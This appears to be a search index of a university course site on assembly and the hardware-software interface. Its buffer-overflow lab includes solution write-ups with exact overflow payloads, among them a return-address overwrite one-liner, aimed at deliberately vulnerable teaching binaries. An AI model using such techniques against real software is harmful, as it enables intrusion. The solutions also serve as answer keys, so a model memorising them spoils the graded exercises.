    "content": ". | We can use Ghidra to disassemble the exec. | The number of arguments given to the main() function must be equal to 2 (one is the name of the executable file). | The second argument (the one given to the executable in the command-line) is passed to the function check_string(). | . In check_string(): . | local_10 must be set to 0x4E305250 to call win() (carefully, use the little-endian encoding) | local_10 is stored at stack - 0x10 | The buffer is stored at stack - 0x30 | So the payload should consist of 32 (48 - 16) 'A' characters, followed by \"\\x50\\x52\\x30\\x4E\" | . ",
    "url": "/labs/lab-10/tasks/overflow-for-binary/solution/README.html",
    
    "relUrl": "/labs/lab-10/tasks/overflow-for-binary/solution/README.html"
  },"87": {
    "doc": "Task: Buffer Overflow for Binary",
    "title": "Task: Buffer Overflow for Binary",
    "content": "Often, we don’t have access to source code and want to discover vulnerabilities in executable files. In the tasks/overflow-for-binary/support/ directory of the laboratory resource archive, you will find an executable file. Using ghidra or gdb for investigation, discover how to exploit the buffer overflow vulnerability to make the program display the message Great success. IMPORTANT To run ghidra on the overflow_in_binary executable file, you need to create a new project and import the executable file. Ghidra will automatically detect the file format. Run the analysis of the executable, then search in the Symbol Tree for the main function. HINT Identify in the disassembled code how input is passed to the program. Identify where the buffer overflow occurs. Identify the comparison condition you want to trigger. Then build the corresponding payload and deliver it in the appropriate format to the program. If you’re having difficulties solving this exercise, go through this reading material. WARNING If you try using a payload generated with python and it doesn’t work, try simply copying its content in the terminal . ",
    "url": "/labs/lab-10/tasks/overflow-for-binary/README.html",
    
    "relUrl": "/labs/lab-10/tasks/overflow-for-binary/README.html"
  },"88": {
    "doc": "Task: Buffer Overflow for Binary",
    "title": "Checking Your Solution",
    "content": "In order to verify your exploit, please complete the exploit.py TODOs. Run it with python3 exploit.py. Afterwards, navigate to the tests directory and run: . make check test........................................passed Total: 100/100 . If your solution is correct, you will receive a 100/100 result. ",
    "url": "/labs/lab-10/tasks/overflow-for-binary/README.html#checking-your-solution",
    
    "relUrl": "/labs/lab-10/tasks/overflow-for-binary/README.html#checking-your-solution"
  },"89": {
    "doc": "Task: Buffer Overflow for Binary",
    "title": "Resources",
    "content": "If you found the laboratory interesting in a positive way, you can learn more about this type of attack, as well as cybersecurity in general, on this channel. ",
    "url": "/labs/lab-10/tasks/overflow-for-binary/README.html#resources",
    
    "relUrl": "/labs/lab-10/tasks/overflow-for-binary/README.html#resources"
  },"90": {
    "doc": "Writeup",
    "title": "Writeup",
    "content": "First use this command to scan the executable: . objdump -M intel -d break_this . | The main() function only calls read_buffer(). | This function reads the length of a buffer from standard input into a variable n. | Then it reads the buffer itself (char buffer[64]). | Because fgets() reads at most n - 1 characters, we can set n to a value bigger than the length of the buffer, so an overflow may be possible. | We will set n to a large enough value: 100 | magic_function() starts at address 0x080491d6 | We see that the buffer passed where fgets() reads starts at ebp - 0x58. | At the address pointed by ebp we find the saved ebp which we must skip, followed by the return address that we need to overwrite. | So we must use 0x58 + 4 = 92 dummy characters A and then the address of magic_function() in little-endian encoding. | . We can find the address of the magic_function() using this command: . student@hsi:/.../overwrite-ret-addr/support$ nm break_this | grep magic_function 080491d6 T magic_function . python2.7 -c 'print \"100\\n\" + \"A\" * 92 + \"\\xd6\\x91\\x04\\x08\"' &gt; payload . ",
    "url": "/labs/lab-10/tasks/overwrite-ret-addr/solution/README.html",
    
    "relUrl": "/labs/lab-10/tasks/overwrite-ret-addr/solution/README.html"
  },"91": {
    "doc": "Task: Overwrite Return Address",
    "title": "Task: Overwrite Return Address",
    "content": "In the previous exercise, we observed how values of variables stored on the stack can be overwritten. Recalling how function calls are made Laboratory 9, the return address from a function callee back to the caller function is also saved on the stack. Exploiting this behavior and starting from the resources in the tasks/overwrite-ret-addr/support/ directory, use a buffer overflow to call the void magic_function() by overwriting the return address in the read_buffer() function. IMPORTANT The void magic_function() calls the cowsay utility, which you need to install with the following command: . sudo apt install cowsay . HINT To inspect the source, use the following command: . objdump -M intel -d break_this . HINT In the read_buffer() function, both the size of the input string and the string itself are read from the keyboard. Although the buffer is defined as char buffer[64], using the value n in the fgets(buffer, n, stdin) call allows for a buffer overflow. Also, fgets() will read a maximum of n - 1 characters; n can be set to a value larger than the actual length of the input string. ",
    "url": "/labs/lab-10/tasks/overwrite-ret-addr/README.html",
    
    "relUrl": "/labs/lab-10/tasks/overwrite-ret-addr/README.html"
  },"92": {
    "doc": "Task: Overwrite Return Address",
    "title": "Checking Your Solution",
    "content": "In order to verify your exploit, please complete the exploit.py TODOs. You can test it using this command: . student@hsi:/.../overwrite-ret-addr/support python3 exploit.py | ./break_this [...] . Afterwards, navigate to the tests directory and run: . student@hsi:/.../overwrite-ret-addr/tests make check test........................................passed Total: 100/100 . If your solution is correct, you will receive a 100/100 result. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-10/tasks/overwrite-ret-addr/README.html#checking-your-solution",
    
    "relUrl": "/labs/lab-10/tasks/overwrite-ret-addr/README.html#checking-your-solution"
  },"93": {
    "doc": "Writeup",
    "title": "Writeup",
    "content": ". | There are 64 characters of 'A' and 4 more in F, L, O, W. | The 64 'A's will fill the data buffer. | And F,L,O,W will fill the stack addresses where the variable is stored (4 bytes). | Carefully watch the little-endian writing. | . ",
    "url": "/labs/lab-10/tasks/read-stdin-gets/solution/README.html",
    
    "relUrl": "/labs/lab-10/tasks/read-stdin-gets/solution/README.html"
  },"94": {
    "doc": "Task: Reading Data from Standard Input",
    "title": "Task: Reading Data from Standard Input",
    "content": "Access the tasks/read-stdin-gets/support/ directory from the lab resource archive and consult the read_stdin.asm file. In this file, there is a program that uses the gets call to read information from standard input into a buffer on the stack. As in the previous case, we have allocated a local variable of 4 bytes immediately after the stack buffer. Carefully review the program, then compile it using the command: . make . then run it using the command: ./read_stdin . Observe the behavior of the program depending on the received input. ",
    "url": "/labs/lab-10/tasks/read-stdin-gets/README.html",
    
    "relUrl": "/labs/lab-10/tasks/read-stdin-gets/README.html"
  },"95": {
    "doc": "Task: Reading Data from Standard Input",
    "title": "Buffer Overflow with Data from Standard Input",
    "content": "The gets function is practically prohibited in C programs because of its high vulnerability: it does not check the limits of the buffer where the reading is done, and can easily be used for buffer overflow. For this, transmit the corresponding input string so that the displayed value for the local variable is not 0xCAFEBABE, but 0x574F4C46 (the ASCII hexadecimal values for FLOW). IMPORTANT Do not modify the assembly language code. Transmit the input string in the appropriate format to the standard input to generate a buffer overflow and to obtain the required result. WARNING Do not write the string \"574F4C46\". This is a string that occupies 8 bytes. You must write the ASCII representation of the number 0x574F4C46, which is FLOW: 0x57 is W, 0x4F is O, 0x4C is L, and 0x46 is F. HINT x86 is a little endian architecture. That means the string \"FLOW\", having the character-ASCII code correspondence. If it seems unclear, check out this link F: 0x46, L: 0x4C, O: 0x4F, W: 0x57 will be stored in memory on 4 bytes as 0x574F4C46. So at the bigger address we will have W, while at the lower address there will be F. HINT To transmit the input string, it is recommended to write it in a file and then redirect that file to the corresponding program command. You can use an editor such as gedit or vim to edit the file. The advantage is that they also display the column you are on, and you can know how many characters you have written in the file. Alternatively, you can use python to more easily generate your payload. For example, to generate a payload that overwrites a value in the code with the value 0xDEADBEEF, you can execute the following command: . python2.7 -c 'print \"A\" * 32 + \"\\xEF\\xBE\\xAD\\xDE\"' &gt; payload . NOTE number 32 is only an example and it represents the size of buffer that needs to be bypassed. It is recommended to name the file payload. Redirecting the payload file to the program is done using a command like: ./read_stdin &lt; payload . If done correctly, you will see: . var is 0x574F4C46 . ",
    "url": "/labs/lab-10/tasks/read-stdin-gets/README.html#buffer-overflow-with-data-from-standard-input",
    
    "relUrl": "/labs/lab-10/tasks/read-stdin-gets/README.html#buffer-overflow-with-data-from-standard-input"
  },"96": {
    "doc": "Task: Reading Data from Standard Input",
    "title": "Checking Your Solution",
    "content": "In order to verify your exploit, please complete the exploit.py TODOs. Run it using python3 exploit.py. Afterwards, navigate to the tests directory and run: . make check test........................................passed Total: 100/100 . If your solution is correct, you will receive a 100/100 result. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-10/tasks/read-stdin-gets/README.html#checking-your-solution",
    
    "relUrl": "/labs/lab-10/tasks/read-stdin-gets/README.html#checking-your-solution"
  },"97": {
    "doc": "Writeup",
    "title": "Writeup",
    "content": "In do_overflow.asm: . | line 37 -&gt; sexy_var is at ebp - 16 | line 47 -&gt; start reading buffer at ebp - 89 | 89 - 16 = 73 of 'A's | and 0x5541494D written in little-endian encoding | . For exercise Stack Canary, when running objdump in main(), look carefully at the instruction at the addresses 4dc, as well as the code around it. ",
    "url": "/labs/lab-10/tasks/overflow-in-c/solution/README.html",
    
    "relUrl": "/labs/lab-10/tasks/overflow-in-c/solution/README.html"
  },"98": {
    "doc": "Task: Buffer Overflow for Program Written in C",
    "title": "Task: Buffer Overflow for Program Written in C",
    "content": "Most often, we will identify buffer overflow vulnerabilities in programs written in C. There we need to see what buffers are and what is the distance from the buffer to the desired variable to be able to overwrite it. IMPORTANT It is important to consider that the distance between a buffer and another variable in C may not correspond to the “real-world” distance; the compiler can make updates, reorders, may leave free spaces between variables, etc. ",
    "url": "/labs/lab-10/tasks/overflow-in-c/README.html",
    
    "relUrl": "/labs/lab-10/tasks/overflow-in-c/README.html"
  },"99": {
    "doc": "Task: Buffer Overflow for Program Written in C",
    "title": "Overwrite Variable Using a Buffer",
    "content": "For the current exercise, access the tasks/overflow-in-c/support/ directory from the lab resource archive and observe the corresponding C source code. For the case where you do not want to compile the code yourself, you have in the archive the equivalent assembly language file and the executable file. Discover the difference between the buffer’s address and the variable’s address, create an input file (also called payload) with which to trigger the overflow and make it so that the message Full of win is displayed. It is recommended to first take a look at the assembly file, then understand the offsets. HINT To see the “real-world” reality, i.e., to find out what the difference is between the buffer and the variable we want to overwrite, consult the equivalent assembly language file (do_overflow.asm), obtained by assembling the C code. In this file, you can find the relative address of the buffer to ebp and the variable to ebp; follow the sequence between lines 36 and 47; you have a mapping between the variable name and the relative offset to ebp. With this information, you can create the string to transmit as a payload to the standard input of the program. NOTE If you want to recompile the files run: . make clean &amp;&amp; make . HINT As above, to transmit the input string for the program, it is recommended to write it in a file and then redirect that file to the corresponding program command. Redirecting the payload file to the program is done using a command like: ./do_overflow &lt; payload . HINT If you are confused about the value in the C code: . if (sexy_var == 0x5541494D) . You can use this site to convert from hexadecimal to ASCII. ",
    "url": "/labs/lab-10/tasks/overflow-in-c/README.html#overwrite-variable-using-a-buffer",
    
    "relUrl": "/labs/lab-10/tasks/overflow-in-c/README.html#overwrite-variable-using-a-buffer"
  },"100": {
    "doc": "Task: Buffer Overflow for Program Written in C",
    "title": "BONUS: Stack Canary",
    "content": "Now that you displayed Full of win!, let’s take a look at the Makefile . cat Makefile . Carefully analyze the compilation options. What do you notice? . As observed above, despite exceeding the buffer size and overwriting another variable in the program, it terminated normally. This is undesirable when working with buffers because they are a potential source of easy attacks. Use objdump to inspect the main function of the executable. HINT To inspect the source, use the following command: . objdump -M intel -d do_overflow . Now, go into the Makefile and modify the CFLAGS parameters by replacing -fno-stack-protector with -fstack-protector. Recompile the program and run it. What do you observe? . NOTE With the -fstack-protector option or flag, we instructed the compiler to enable Stack Smashing Protection for our executable. Therefore, any buffer overflow attack will be detected in the code, and the program execution will terminate with an error. Inspect the recompiled executable again with the new flag using objdump. What has changed? . NOTE The compiler introduced a randomly generated value called a canary onto the stack, which it checks before exiting the current function’s execution. Through buffer overflow, this canary was overwritten upon exceeding the buffer’s size, resulting in a mismatch between the initial canary value and the one at the end of the function execution. Recompile the files and run: . make clean &amp;&amp; make . If you try the same payload, it will not work because of the canary generated. You will most likely see a message like this: . Not quite there. Try again! *** stack smashing detected ***: terminated Aborted (core dumped) . ",
    "url": "/labs/lab-10/tasks/overflow-in-c/README.html#bonus-stack-canary",
    
    "relUrl": "/labs/lab-10/tasks/overflow-in-c/README.html#bonus-stack-canary"
  },"101": {
    "doc": "Task: Buffer Overflow for Program Written in C",
    "title": "Checking Your Solution",
    "content": "In order to verify your exploit, please complete the exploit.py TODOs. Afterwards, navigate to the tests directory and run: . make check test........................................passed Total: 100/100 . If your solution is correct, you will receive a 100/100 result. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-10/tasks/overflow-in-c/README.html#checking-your-solution",
    
    "relUrl": "/labs/lab-10/tasks/overflow-in-c/README.html#checking-your-solution"
  },"102": {
    "doc": "Task: Buffer in the .data Section",
    "title": "Task: Buffer in the .data Section",
    "content": "Navigate to the tasks/data-buffer/support/ directory in the laboratory’s resource archive and open the data_buffer.asm file. This file contains a program that populates a buffer with information and then displays it. Carefully review the program, then compile it using the command: . make . Notice that after running the above compilation command, both an object file and an executable file are generated. You can verify this by running the command: . ls . Run the program using the executable file, using the command: ./data_buffer . Observe the behavior of the program based on its code. ",
    "url": "/labs/lab-10/tasks/data-buffer/README.html",
    
    "relUrl": "/labs/lab-10/tasks/data-buffer/README.html"
  },"103": {
    "doc": "Lab 10 - Buffer Management. Buffer Overflow",
    "title": "Lab 10 - Buffer Management. Buffer Overflow",
    "content": " ",
    "url": "/labs/lab-10/README.html",
    
    "relUrl": "/labs/lab-10/README.html"
  },"104": {
    "doc": "Lab 10 - Buffer Management. Buffer Overflow",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-10/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-10/README.html#getting-the-latest-changes"
  },"105": {
    "doc": "Lab 10 - Buffer Management. Buffer Overflow",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-09\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-10: . student@hsi:~/hardware-software-interface$ git checkout -b lab-10 main # Replace lab-10 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-10/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-10/README.html#save-progress-and-prepare-next-lab"
  },"106": {
    "doc": "Task: Fibonacci",
    "title": "Task: Fibonacci",
    "content": "You will solve this exercise starting from the fibonacci.asm file located in the tasks/fibonacci directory. Calculate the Nth Fibonacci number, where N is given through the eax register. NOTE: The Nth Fibonacci number is F[N] for our chosen N. By definition, F[0] = 0 and F[1] = F[2] = 1. Each following value is calculated with the formula F[i] = F[i - 1] + F[i - 2]. TIP: For example, if the value stored in ecx is equal to 5, a correct solution will display 5 and for 7, it will display 13. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_fibonacci ........................ passed ... 100 ======================================================================== Total: 100/100 . NOTE : If you wish to test for various values of N, just change its value at line 6 in support/fibonacci.asm to whatever you desire (that whatever should fit in 4 bytes, of course :-) ). If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-04/tasks/fibonacci/README.html",
    
    "relUrl": "/labs/lab-04/tasks/fibonacci/README.html"
  },"107": {
    "doc": "Task: Grumpy Jumps",
    "title": "Task: Grumpy Jumps",
    "content": "You will solve the exercises starting from the grumpy_jumps.asm file located in the tasks/grumpy-jumps directory. | Modify the values of the eax and ebx registers so that when the program is run, the message Well done! is displayed. Follow the TODO comments. | Why does the wrong message still appear? Modify the source so that the wrong message is not displayed anymore. | . TIP: To determine the necessary values for the eax and ebx registers, we recommend using GDB. To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh test_display_right ........................ passed ... 50 test_display_only_right ........................ passed ... 50 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-04/tasks/grumpy-jumps/README.html",
    
    "relUrl": "/labs/lab-04/tasks/grumpy-jumps/README.html"
  },"108": {
    "doc": "Task: Carry Flag - Overflow Flag",
    "title": "Task: Carry Flag - Overflow Flag",
    "content": "You will solve these exercises starting from the of.asm, cf.asm and cf_of.asm files located in the tasks/cf-of directory. Using the add instruction on the al register: . | Set the OF flag . | Set the CF flag . | Set both flags simultaneously. | . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_overflow_flag ........................ passed ... 25 test_carry_flag ........................ passed ... 25 test_carry_and_overflow_flag ........................ passed ... 50 ======================================================================== Total: 100/100 . If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-04/tasks/cf-of/README.html",
    
    "relUrl": "/labs/lab-04/tasks/cf-of/README.html"
  },"109": {
    "doc": "Task: Conditional Jumps",
    "title": "Task: Conditional Jumps",
    "content": "You will solve the exercises starting from the hello_world.asm file located in the tasks/conditional-jumps directory. | Modify the program so that the message is displayed only if the content of the eax register is greater than that of ebx. Also, modify the values of the registers to continue displaying the message \"Hello, World!\". | Modify the program to also display \"Goodbye, World!\" at the end. | Using jump instructions, modify the program to display \"Hello, World!\" N times, where N is given through the ecx register. Avoid infinite looping. | . TIP: After a successful completion (with N = 6), the program should display: . 6 Hello, World! Hello, World! Hello, World! Hello, World! Hello, World! Hello, World! Goodbye, World! . To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_one_hello ........................ passed ... 10 test_N_hellos ........................ passed ... 60 test_N_hellos_and_one_goodbye ........................ passed ... 30 ======================================================================== Total: 100/100 . NOTE(1) : If you wish to test for various values of N, just change its value at line 7 in support/hello_world.asm to whatever you desire (that whatever should fit in 4 bytes, of course :-) ). NOTE(2) : Please use the strings provided in the exercise exactly as they are. If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-04/tasks/conditional-jumps/README.html",
    
    "relUrl": "/labs/lab-04/tasks/conditional-jumps/README.html"
  },"110": {
    "doc": "Task: Sets",
    "title": "Task: Sets",
    "content": "You will solve the exercises starting from the sets.asm file located in the tasks/sets directory. You need to implement operations on sets that can contain elements between 0 and 31. An efficient way to do this (both in terms of space and speed) would be to represent sets so that a register represents a set. Each bit in the register represents an element in the set (if bit i is set, then the set contains element i). TIP: For example: if eax contains the representation of the set {0, 2, 4}, the register value would be 2^0 + 2^2 + 2^4 = 1 + 4 + 16 = 21. Educate yourself about the available instructions on the x86 architecture. | You have two defined sets. What values do they contain? You do not need to make the code print the actual values stored in the sets. Perform the union of the two sets. | Use the or instruction to add two new elements to the first set (the set stored in the eax register). | . NOTE: Do not reset the eax register after this exercise. Its new value will be the one used by the checker for further evaluation. TIP: Take advantage of the fact that the current sets, although they have “space” for 32 bits, only use 8 bits. If you or with a number greater than 255 (0xff, 2^8-1) which has two active bits, you will effectively add two new elements to the set. | Perform the intersection of the two sets. | Determine the elements missing from the eax set for it to be complete. | . TIP: You need to take the complement of the number using the not instruction. | Remove an element from the first set (the set stored in the eax register). | . NOTE: Do not reset the eax register after this exercise. Its new value will be the one used by the checker for further evaluation. | Find the difference between the sets. | . NOTE: In order for the checker to be able to check your results, you should be displaying the values in the order they are stated here. To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh test_reunion ........................ passed ... 10 test_add_value_in_first_set ........................ passed ... 20 test_intersection ........................ passed ... 10 test_missing_elements_first_set ........................ passed ... 20 test_remove_element_first_set ........................ passed ... 20 test_difference ........................ passed ... 20 ======================================================================== Total: 100/100 . NOTE : If you wish to test for various sets, just change their values at line 6 and 7 respectively in support/sets.asm to whatever you desire (that whatever should fit in 4 bytes, of course :-) ). If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-04/tasks/sets/README.html",
    
    "relUrl": "/labs/lab-04/tasks/sets/README.html"
  },"111": {
    "doc": "Task: Min",
    "title": "Task: Min",
    "content": "You will solve this exercise starting from the min.asm file located in the tasks/min directory. Calculate the minimum of the numbers in 2 registers (eax and ebx) using a comparison instruction, a jump instruction, and the xchg instruction. To test the implementation, enter the tests/ directory and run: ./run_all_tests.sh test_use_compare ........................ passed ... 10 test_use_jump ........................ passed ... 10 test_use_xchg ........................ passed ... 10 test_check_result ........................ passed ... 70 ======================================================================== Total: 100/100 . NOTE : If you wish to test for various values of the two numbers, just change their values at line 6 and 7 respectively in support/min.asm to whatever you desire (that whatever should fit in 4 bytes, of course :-) ). If you’re having difficulties solving this exercise, go through this reading material. ",
    "url": "/labs/lab-04/tasks/min/README.html",
    
    "relUrl": "/labs/lab-04/tasks/min/README.html"
  },"112": {
    "doc": "Guide: Discovering Assembly",
    "title": "Guide: Discovering Assembly",
    "content": "To follow this guide, you will need to navigate to the guides/discovering-assembly/support directory. | Open the ex1.asm file and read the comments. Assemble it by using the make utility and run it. Using gdb, go through the program line by line (the start command followed by next) and observe the changes in register values after executing the mov and add instructions. Ignore the sequence of PRINTF32 instructions. | Open the ex2.asm file and read the comments. Assemble it by using the make utility and run it. Using gdb, observe the change in the eip register when executing the jmp instruction. To skip the PRINTF32 instructions, add a breakpoint at the jump_incoming label (the break command followed by run). | Open the ex3.asm file and read the comments. Assemble it by using the make utility and run it. Using gdb, navigate through the program using breakpoints. Follow the program flow. Why is 15 displayed first and then 3? Because of the jump at line 9. Where does the jump at line 25 point to? To the zone1 label. | Open the ex4.asm file and read the comments. Assemble it by using the make utility and run it. Using gdb, go through the program. Why isn’t the jump at line 12 taken? Because the je instruction jumps if the ZF bit in the FLAGS register is set. This bit is set by the cmp instruction, which calculates the difference between the values of the eax and ebx registers without storing the result. However, the add instruction at line 11 clears this flag because the result of the operation is different from 0. | . ",
    "url": "/labs/lab-04/guides/discovering-assembly/README.html",
    
    "relUrl": "/labs/lab-04/guides/discovering-assembly/README.html"
  },"113": {
    "doc": "Guide: First Look at Assembly Instructions",
    "title": "Guide: First Look at Assembly Instructions",
    "content": "To follow this guide, you will need to use the instructions.asm file located in the guides/instructions/support directory. Diving right into the demo, we can see one of the most important instructions that helps us, programmers, work with the stack and that is push. We discussed what the push instruction does in the reading section. Considering its call, we can understand that it takes the 0 value(as a DWORD, a number stored on 4 bytes) and moves it onto the “top” of the stack. That push is followed by a new instruction: . popf . IMPORTANT: The popf instruction is used for setting, depending on how many bytes we pop from the stack(in our case, 4 bytes), the EFLAGS register(setting the entire register when popping 4 bytes and only the 2 lower bytes of the register when popping 2 bytes). You can read more about the popf instruction here and here. Having in mind what the popf instruction does, try to guess what would adding the following line of code at line 15 and the mystery_label label at the line(of the current file, before adding the instruction) 53 would make the program do. jnc mystery_label . Moving on, we can see that the 0 value is set to the eax register using the mov instruction. Can you give example of another two ways of setting the value in eax to 0 without using mov ? . HINT: Think about the logical operators. Next, by using the test instruction we can set the flags based on the output of the logical and between eax and itself. After resetting the flags, we store 0xffffffff in the ebx register(which is actually the largest number it can store before setting the carry flag) and then use the test instruction yet again. Similarly, what do you think adding the following line of code after the test instruction would produce ? . jnz mystery_label . We reset the flags once again and now we take a look at working with the smaller portions of the eax register. Can you guess the output of the following command, put right under the add al, bl instruction ? What about the flags ? Which flag has been set ? . PRINTF32 `%d\\n\\x0`, eax . Similarly, try to answer the same questions from above, but considering the next portions of the code. After thoroughly inspecting this example, you should have a vague idea about how setting the flags works. ",
    "url": "/labs/lab-04/guides/instructions/README.html",
    
    "relUrl": "/labs/lab-04/guides/instructions/README.html"
  },"114": {
    "doc": "Lab 4 - Introduction to Assembly Language",
    "title": "Lab 4 - Introduction to Assembly Language",
    "content": " ",
    "url": "/labs/lab-04/README.html",
    
    "relUrl": "/labs/lab-04/README.html"
  },"115": {
    "doc": "Lab 4 - Introduction to Assembly Language",
    "title": "Getting the Latest Changes",
    "content": "Before starting this lab, ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/lab-04/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/lab-04/README.html#getting-the-latest-changes"
  },"116": {
    "doc": "Lab 4 - Introduction to Assembly Language",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab-03\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab-04: . student@hsi:~/hardware-software-interface$ git checkout -b lab-04 main # Replace lab-04 with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | . ",
    "url": "/labs/lab-04/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/lab-04/README.html#save-progress-and-prepare-next-lab"
  },"117": {
    "doc": "Task: Bonus: Rot13",
    "title": "Task: Bonus: Rot13",
    "content": "Navigate to tasks/rot13/support/. Create and use a function that performs rot13 translation of a string. ",
    "url": "/labs/lab-08/tasks/rot13/README.html",
    
    "relUrl": "/labs/lab-08/tasks/rot13/README.html"
  },"118": {
    "doc": "Task: Bonus: Rot13",
    "title": "Bonus: Rot13++",
    "content": "Implement rot13 on an array of strings: the strings are contiguous in memory separated by the string terminator (NULL-byte, 0). For example, lorem\\0ipsum\\0dolor\\0 is an array of three strings. Apply rot13 to alphabetical characters and replace the string terminator with a space (' ', blank, character 32, or 0x20). Thus, the initial string lorem\\0ipsum\\0dolor\\0 will translate to yberz vcfhz qbybe. NOTE: To define the array of strings containing the string terminator, use a construction like: . mystring db \"lorem\", 0, \"ipsum\", 0, \"dolor\", 0 . NOTE: You will need to know when to stop traversing the array of strings. The simplest way is to define a length variable in the .data section, like so: . len dd 10 . where you either store the total length of the string (from the beginning to the last NULL byte) or the number of strings in the array. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_rot13_plus_plus ........................ passed ... 50 test_rot13_with_uppercase ........................ passed ... 50 Total: 100/100 . If you’re having trouble solving this exercise, go through this reading material. ",
    "url": "/labs/lab-08/tasks/rot13/README.html#bonus-rot13",
    
    "relUrl": "/labs/lab-08/tasks/rot13/README.html#bonus-rot13"
  },"119": {
    "doc": "Task: Implementing the toupper() Function",
    "title": "Task: Implementing the toupper() Function",
    "content": "Navigate to tasks/to-upper/support/. We aim to implement the toupper() function, which converts lowercase letters to uppercase. To do this, start with the to_upper.asm file from the lab exercises archive and complete the body of the toupper() function. The string used is mystring, and we assume it is a valid string. This string is passed as an argument to the toupper() function when called. Perform the transformation in place; there is no need for another string. NOTE_ To convert a lowercase letter to uppercase, you need to subtract 0x20 from its value. This is the difference between lowercase and uppercase letters; for example, a is 0x61, and A is 0x41. You can see this in the ASCII manual page. To read or write byte by byte, use the byte [reg] construction as seen in the implementation of determining the length of a string in the print_string_length.asm file, where [reg] is the pointer register storing the address of the string at that point. Stop when you reach the value 0 (NULL byte). For checking, you can use test as seen in the implementation of determining the length of a string in the print-string-length.asm file. ",
    "url": "/labs/lab-08/tasks/to-upper/README.html",
    
    "relUrl": "/labs/lab-08/tasks/to-upper/README.html"
  },"120": {
    "doc": "Task: Implementing the toupper() Function",
    "title": "Bonus: toupper() Only for Lowercase Letters",
    "content": "Implement the toupper() function so that the transformation occurs only for lowercase characters, not uppercase letters or other types of characters. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_to_upper_1 ........................ passed ... 33 test_to_upper_2 ........................ passed ... 33 test_to_upper_3 ........................ passed ... 34 Total: 100/100 . If you’re having trouble solving this exercise, go through this reading material. ",
    "url": "/labs/lab-08/tasks/to-upper/README.html#bonus-toupper-only-for-lowercase-letters",
    
    "relUrl": "/labs/lab-08/tasks/to-upper/README.html#bonus-toupper-only-for-lowercase-letters"
  },"121": {
    "doc": "Task: Displaying the Length of a String",
    "title": "Task: Displaying the Length of a String",
    "content": "Navigate to tasks/string-print-len/support/. The program print_string_len.asm displays the length of a string using the PRINTF32 macro. The calculation of the length of the mystring string occurs within the program (it is already implemented). Implement the program to display the length of the string using the printf function. At the end, you will have the length of the string displayed twice: initially with the PRINTF32 macro and then with the external function call printf. NOTE: Consider that the printf call is of the form printf(\"String length is %u\\n\", len);. You need to construct the stack for this call. The steps to follow are: . | Mark the symbol printf as external. | Define the format string \"String length is %u\", 10, 0. | Make the function call to printf, i.e.: . | Put the two arguments on the stack: the format string and the length. | Call printf using call. | Restore the stack. | . | . The length of the string is found in the ecx register. To test the implementation, enter the tests/ directory and run: . make check . In case of a correct solution, you will get an output such as: ./run_all_tests.sh test_length_zero ........................ passed ... 20 test_length_small ........................ passed ... 40 test_length_large ........................ passed ... 40 Total: 100/100 . If you’re having trouble solving this exercise, go through this 